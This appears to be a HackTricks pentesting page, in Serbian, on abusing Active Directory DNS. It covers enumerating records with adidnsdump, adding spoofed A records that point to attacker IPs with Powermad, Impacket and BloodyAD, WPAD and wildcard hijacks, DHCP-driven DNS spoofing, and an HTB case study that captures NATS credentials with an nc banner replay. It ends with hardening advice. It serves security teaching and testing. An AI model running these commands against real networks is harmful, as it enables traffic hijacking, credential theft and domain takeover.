# AD DNS zapisi

{{#include ../../banners/hacktricks-training.md}}

Podrazumevano **svaki korisnik** u Active Directory-ju može da **nabroji sve DNS zapise** u DNS zonama domena ili šume, slično kao kod zone transfera (korisnici mogu da izlistaju podređene objekte DNS zone u AD okruženju).

Alat [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) omogućava **nabrajanje** i **izvoz** **svih DNS zapisa** u zoni za izviđanje internih mreža.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

> adidnsdump v1.4.0 (april 2025) dodaje JSON/Greppable (`--json`) izlaz, višestruko-nitno DNS razrešavanje i podršku za TLS 1.2/1.3 pri povezivanju na LDAPS  

Za više informacija pročitajte [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Kreiranje / Izmena zapisa (ADIDNS spoofing)

Pošto grupa **Authenticated Users** podrazumevano ima dozvolu **Create Child** na DACL-u zone, svaki nalog domena (ili računarski nalog) može da registruje dodatne zapise. Ovo se može iskoristiti za otmicu saobraćaja, iznuđivanje NTLM relay-a ili čak potpuno kompromitovanje domena.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py dolazi uz Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Uobičajeni primitivni napadi

1. **Wildcard record** – `*.<zone>` pretvara AD DNS server u responder za celo preduzeće, slično LLMNR/NBNS spoofing-u. Može se zloupotrebiti za hvatanje NTLM hash-eva ili njihovo prosleđivanje ka LDAP/SMB. (Zahteva da WINS-lookup bude onemogućen.)<sup>[[1]](#references)</sup>    
2. **WPAD hijack** – dodajte `wpad` (ili **NS** record koji upućuje na host napadača, kako biste zaobišli Global-Query-Block-List) i transparentno prosleđujte odlazne HTTP zahteve kroz proxy radi prikupljanja akreditiva. Microsoft je zakrpio wildcard/DNAME zaobilaženja (CVE-2018-8320), ali **NS-records i dalje rade**.<sup>[[1]](#references)</sup>    
3. **Preuzimanje zastarelog unosa** – preuzmite IP adresu koja je ranije pripadala radnoj stanici i povezani DNS unos će se i dalje razrešavati, omogućavajući napade resource-based constrained delegation ili Shadow-Credentials bez ikakvog menjanja DNS-a.    
4. **DHCP → DNS spoofing** – u podrazumevanoj Windows DHCP+DNS postavci, neautentifikovani napadač na istoj podmreži može da izmeni bilo koji postojeći A record (uključujući Domain Controller-e) slanjem falsifikovanih DHCP zahteva koji pokreću dinamička DNS ažuriranja (Akamai „DDSpoof”, 2023).  To omogućava machine-in-the-middle napad na Kerberos/LDAP i može dovesti do potpunog preuzimanja domena.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – promenite `dNSHostName` mašinskog naloga koji kontrolišete, registrujte odgovarajući A record, a zatim zatražite sertifikat za to ime kako biste se lažno predstavljali kao DC. Alati kao što su **Certipy** ili **BloodyAD** u potpunosti automatizuju ovaj tok.  

AD DNS record sa [serijalizovanim informacijama o cilju](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) može biti deo uslovnog lanca relay napada: pozivaocu su potrebna prava za kreiranje record-a, putanja za coercion koja navodi ciljni računar da se autentifikuje na to ime i odredište za relay koje prihvata dobijenu autentifikaciju. Zasebno procenite odredišni protokol; SMB signing na dolaznoj vezi sam po sebi ne određuje da li HTTPS WinRM odredište prihvata relay. Nivo zakrpa, obrada imena, Extended Protection i konfiguracija servisa mogu uticati na ishod.

---

### Hijacking internih servisa preko zastarelih dinamičkih record-a (studija slučaja NATS)

Kada su dinamička ažuriranja otvorena svim autentifikovanim korisnicima, **ime odjavljenog servisa može ponovo da se preuzme i usmeri na infrastrukturu napadača**. Mirage HTB DC izložio je hostname `nats-svc.mirage.htb` nakon DNS scavenging-a, tako da je svaki korisnik sa niskim privilegijama mogao da:<sup>[[3]](#references)</sup>

1. **Potvrdite da record nedostaje** i saznajte SOA pomoću `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Ponovo kreirajte zapis** ka spoljašnjem/VPN interfejsu koji kontrolišu:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Lažno se predstavljajte kao servis koji koristi otvoreni tekst**. NATS klijenti očekuju da vide jedan baner `INFO { ... }` pre nego što pošalju akreditive, tako da je dovoljno kopirati legitiman baner sa pravog brokera da biste prikupili tajne:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Svaki klijent koji razreši oteto ime odmah će poslati svoj JSON `CONNECT` okvir (uključujući `"user"`/`"pass"`) listeneru. Pokretanje zvaničnog binarnog fajla `nats-server -V` na hostu napadača, isključivanje redakcije logova ili jednostavno snimanje sesije pomoću Wiresharka daje iste plaintext akreditive, jer je TLS bio opcionalan.

4. **Pivot pomoću uhvaćenih akreditiva** – u Mirage-u je ukradeni NATS nalog omogućio pristup JetStream-u, čime su otkriveni istorijski događaji autentifikacije koji su sadržali ponovo upotrebljiva AD korisnička imena/lozinke.

Ovaj obrazac važi za svaku uslugu integrisanu sa AD-om koja se oslanja na nezaštićene TCP handshake-ove (HTTP API-je, RPC, MQTT itd.): čim se DNS zapis otme, napadač postaje ta usluga.
Za enumeraciju na strani brokera i postupak rada sa sačuvanim porukama pogledajte [NATS / JetStream pentesting](../../network-services-pentesting/4222-pentesting-nats.md).

---

## Otkrivanje i ojačavanje

* Uskratite grupi **Authenticated Users** pravo *Create all child objects* na osetljivim zonama, a dinamička ažuriranja delegirajte namenskom nalogu koji koristi DHCP.
* Ako su dinamička ažuriranja neophodna, podesite zonu na **Secure-only** i omogućite **Name Protection** u DHCP-u kako bi samo objekat računara koji je vlasnik mogao da prepiše sopstveni zapis.
* Nadgledajte DNS Server događaje ID 257/252 (dinamičko ažuriranje), 770 (prenos zone) i LDAP upise u `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blokirajte opasna imena (`wpad`, `isatap`, `*`) pomoću namerno bezazlenog zapisa ili Global Query Block List-a.
* Redovno ažurirajte DNS servere zakrpama – npr. RCE ranjivosti CVE-2024-26224 i CVE-2024-26231 dostigle su **CVSS 9.8** i mogu se daljinski iskoristiti protiv Domain Controller-a.  



## References

- [1] [ADIDNS ponovo razmotren: WPAD, GQBL i još mnogo toga](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Lažiranje DNS zapisa zloupotrebom dinamičkih DNS ažuriranja putem DHCP-a](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: ulančavanje NFS curenja, zloupotrebe dinamičkog DNS-a, krađe NATS akreditiva, JetStream tajni i Kerberoasting-a](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Ulazak u zonu: izlistavanje Active Directory DNS-a pomoću adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
